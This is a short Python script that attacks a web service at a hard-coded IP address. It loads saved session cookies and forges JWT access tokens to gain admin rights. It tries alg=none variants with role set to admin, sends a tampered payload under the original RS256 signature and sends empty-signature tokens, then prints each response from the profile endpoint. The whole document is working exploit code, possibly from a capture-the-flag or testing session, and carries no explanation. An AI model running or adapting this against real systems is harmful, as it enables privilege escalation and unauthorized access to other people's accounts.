import requests, re, json, base64
BASE='http://15.252.91.100'
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def b64d(x): return base64.urlsafe_b64decode(x+'='*(-len(x)%4))

s=requests.Session(); s.headers.update({'User-Agent':'Mozilla/5.0'})
s.cookies.update(json.load(open('cn_cookies.json')))
orig=s.cookies.get('cloudnine_access')
h,p,sig=orig.split('.')
payload=json.loads(b64d(p))
print('orig payload', payload)

def try_token(tok, label):
    jar=requests.cookies.RequestsCookieJar()
    for k,v in s.cookies.get_dict().items(): jar.set(k,v)
    jar.set('cloudnine_access', tok)
    r=requests.get(BASE+'/api/profile/', cookies=jar, headers={'User-Agent':'M'}, timeout=15)
    print(f'[{label}] profile {r.status_code}: {r.text[:200]}')

# 1) alg=none variants
for algname in ['none','None','NONE']:
    hdr={'alg':algname,'typ':'JWT'}
    pl=dict(payload); pl['role']='admin'; pl['is_admin']=True
    tok=b64u(json.dumps(hdr))+'.'+b64u(json.dumps(pl))+'.'
    try_token(tok, 'alg='+algname)

# 2) keep RS256 header but tamper payload (test signature verification strictness)
pl=dict(payload); pl['role']='admin'
tok=h+'.'+b64u(json.dumps(pl))+'.'+sig
try_token(tok, 'RS256 tampered payload same sig')

# 3) empty sig with RS256
tok=h+'.'+b64u(json.dumps(pl))+'.'
try_token(tok,'RS256 empty sig')
